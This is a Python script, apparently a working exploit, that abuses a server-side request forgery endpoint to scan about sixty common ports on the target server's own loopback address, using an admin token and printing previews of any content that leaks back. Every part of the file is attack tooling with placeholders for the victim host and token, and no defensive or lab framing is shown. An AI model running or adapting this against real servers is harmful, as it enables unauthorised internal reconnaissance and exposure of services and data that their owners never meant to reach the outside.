import requests
import json
URL = "http://IP_ADDRESS:PORT/PATH/TO/SSRF_ENDPOINT"
TOKEN = "<YOUR_ADMIN_TOKEN>"
TARGET = "http://127.0.0.1"

PORTS = [
    21, 22, 23, 25, 53, 80, 88, 110, 111, 135, 139, 143, 389, 443, 445,
    465, 500, 512, 513, 514, 587, 631, 636, 873, 993, 995, 1080, 1433,
    1521, 2049, 2375, 2376, 3000, 3306, 3389, 4369, 5000, 5432, 5672,
    5900, 5984, 6379, 6443, 7001, 7474, 8000, 8080, 8081, 8082, 8443,
    8500, 8983, 9000, 9090, 9200, 9300, 11211, 27017, 27018, 28017
]
def check_port(session, port):
    payload = {
        "uuid": TOKEN,
        "url": f"{TARGET}:{port}"
    }
    try:
        r = session.post(URL, json=payload, timeout=10)
        data = r.json()
        is_open = (
        data.get("status") == "success" and
        data.get("message") not in [None, "", "false", False]
        )
        status_str = "OPEN ✓" if is_open else "closed"
        print(f"Port {port:5d} | {status_str}" + (f" | message preview: {str(data.get('message'))[:60]}" if is_open else ""))
        return is_open, data.get("message")
    except Exception as e:
        print(f"Port {port:5d} | ERROR: {e}")
        return False, None
def main():
    session = requests.Session()
    open_ports = []
    print(f"[*] SSRF port scan su {TARGET}\n")
    for port in PORTS:
        is_open, message = check_port(session, port)
        if is_open:
            open_ports.append((port, message))
        print(f"\n[+] Porte aperte trovate: {len(open_ports)}")
    for port, msg in open_ports:
        print(f" -> {port} | content length: {len(str(msg))} chars")


if __name__ == "__main__":
    main()